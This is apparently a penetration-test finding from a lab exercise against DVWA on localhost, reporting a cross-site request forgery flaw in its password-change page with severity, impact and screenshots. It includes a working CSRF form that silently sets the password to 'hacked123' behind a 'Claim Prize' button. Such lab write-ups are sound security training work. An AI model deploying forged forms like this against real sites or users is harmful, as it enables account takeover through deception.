# Finding 05 — Cross-Site Request Forgery (CSRF)

**Severity:** Medium  
**OWASP:** A01:2021 – Broken Access Control  
**URL:** http://localhost/vulnerabilities/csrf/

## Description
The password change functionality does not implement CSRF tokens or any origin verification. An attacker can craft a malicious HTML page that silently triggers a password change request on behalf of an authenticated victim who visits the page.

## Recon
The CSRF page accepts a GET request to change the admin password with parameters `password_new`, `password_conf`, and `Change`. No CSRF token is present in the request or validated server-side.

## Testing
Crafted a malicious HTML file (`csrf_attack.html`) containing a form that submits a password change request to DVWA:
```html
<form action="http://localhost/vulnerabilities/csrf/" method="GET">
  <input type="hidden" name="password_new" value="hacked123">
  <input type="hidden" name="password_conf" value="hacked123">
  <input type="hidden" name="Change" value="Change">
  <input type="submit" value="Claim Prize">
</form>
```

## Exploit
Opened the malicious HTML file in the same browser where the victim was logged into DVWA. Clicking "Claim Prize" sent the forged request and the server responded with "Password Changed." — confirming the attack succeeded without the user visiting the CSRF page directly.

## Severity Reasoning
Rated Medium because it requires the victim to be logged in and to click a link or visit an attacker-controlled page. However, social engineering makes this trivially exploitable in real-world scenarios.

## Business Impact
An attacker sends the malicious link via email or social media. One click by a logged-in user silently changes their password. The attacker then logs in with the new password achieving full account takeover.

## Screenshot
![CSRF Attack Page](../SCREENSHOT%20%237.png)
![CSRF Confirmed](../SCREENSHOT%20%238.png)
